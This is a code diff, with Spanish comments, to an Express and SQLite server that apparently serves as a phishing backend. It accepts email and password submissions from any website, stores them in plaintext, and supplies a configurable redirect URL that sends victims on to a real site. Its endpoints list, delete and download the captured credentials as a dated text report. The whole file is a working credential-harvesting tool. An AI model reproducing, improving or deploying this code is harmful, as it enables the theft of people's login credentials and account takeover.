@@ -1,53 +1,52 @@
-const express = require("express")
-const sqlite3 = require("sqlite3").verbose()
-const cors = require("cors") // <--- Añadir esta línea
+const express = require("express");
+const sqlite3 = require("sqlite3").verbose();
+const cors = require("cors");
+const path = require("path");
 
-const app = express()
+const app = express();
 
-app.use(cors()) // <--- Habilitar que cualquier web use tu script
-app.use(express.json())
-app.use(express.static("public"))
+// Middlewares
+app.use(cors());
+app.use(express.json());
+app.use(express.static("public"));
 
-const db = new sqlite3.Database("database.db")
+// Base de Datos
+const db = new sqlite3.Database("database.db");
 
-// Creamos las tablas: logins y una tabla de configuración para el link
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS logins (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email TEXT, password TEXT, date DATETIME DEFAULT CURRENT_TIMESTAMP
+        email TEXT,
+        password TEXT,
+        date DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
 
     db.run(`CREATE TABLE IF NOT EXISTS config (
         id INTEGER PRIMARY KEY,
         redirect_url TEXT
     )`, () => {
-        // Insertar link por defecto si no existe
-        db.run("INSERT OR IGNORE INTO config (id, redirect_url) VALUES (1, 'https://google.com')");
+        db.run("INSERT OR IGNORE INTO config (id, redirect_url) VALUES (1, 'https://www.google.com')");
     });
 });
 
-/* --- RUTAS DE CONFIGURACIÓN --- */
-
+// Rutas de Configuración
 app.get("/config", (req, res) => {
     db.get("SELECT redirect_url FROM config WHERE id = 1", (err, row) => {
-        res.json(row || { redirect_url: "https://google.com" });
+        res.json(row || { redirect_url: "https://www.google.com" });
     });
 });
 
 app.post("/config", (req, res) => {
     const { url } = req.body;
-    db.run("UPDATE config SET redirect_url = ? WHERE id = 1", [url], function(err) {
-        if (err) return res.status(500).json({ error: "error al guardar" });
+    db.run("UPDATE config SET redirect_url = ? WHERE id = 1", [url], () => {
         res.json({ success: true });
     });
 });
 
-/* --- OTRAS RUTAS (LOGINS Y DATA) --- */
-
+// Rutas de Datos
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
-    db.run("INSERT INTO logins (email, password) VALUES (?,?)", [email, password], (err) => {
-        if (err) return res.status(500).json({ error: "db error" });
+    db.run("INSERT INTO logins (email, password) VALUES (?, ?)", [email, password], () => {
         res.json({ saved: true });
     });
 });
@@ -58,18 +57,23 @@ app.get("/data", (req, res) => {
     });
 });
 
+app.delete("/delete/:id", (req, res) => {
+    db.run("DELETE FROM logins WHERE id = ?", [req.params.id], () => {
+        res.json({ deleted: true });
+    });
+});
+
 app.get("/download/:limit", (req, res) => {
-    const limit = Number(req.params.limit);
+    const limit = Number(req.params.limit) || 100;
     db.all("SELECT * FROM logins ORDER BY id DESC LIMIT ?", [limit], (err, rows) => {
-        let text = "";
-        rows.forEach(row => text += `ID: ${row.id} | Email: ${row.email} | Pass: ${row.password}\n`);
+        let text = "REPORTE DE LOGINS\n\n";
+        rows.forEach(row => {
+            text += `ID: ${row.id} | Email: ${row.email} | Pass: ${row.password} | Fecha: ${row.date}\n`;
+        });
         res.setHeader("Content-Disposition", "attachment; filename=datos.txt");
         res.send(text);
     });
 });
 
-app.delete("/delete/:id", (req, res) => {
-    db.run("DELETE FROM logins WHERE id=?", [req.params.id], () => res.json({ deleted: true }));
-});
-
-app.listen(3000, () => console.log("Servidor en http://localhost:3000"));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
